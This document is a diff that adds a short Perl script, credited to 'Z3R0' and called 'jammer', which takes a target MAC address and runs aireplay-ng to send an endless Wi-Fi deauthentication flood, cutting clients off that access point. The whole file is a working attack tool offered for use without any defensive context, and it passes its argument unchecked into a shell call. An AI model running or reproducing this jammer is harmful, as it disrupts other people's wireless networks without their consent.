@@ -1,0 +1,9 @@
+#!/usr/bin/perl
+#Coded By Z3R0#
+$mac=$ARGV[0]; 
+if( $ARGV[0] eq '-h' || $ARGV[0] eq '' || $ARGV[0] eq '--help')
+{
+print "Usage: jammer <mac>\n";
+exit;
+}
+system("aireplay-ng -0 0 -a $mac wlan0mon")
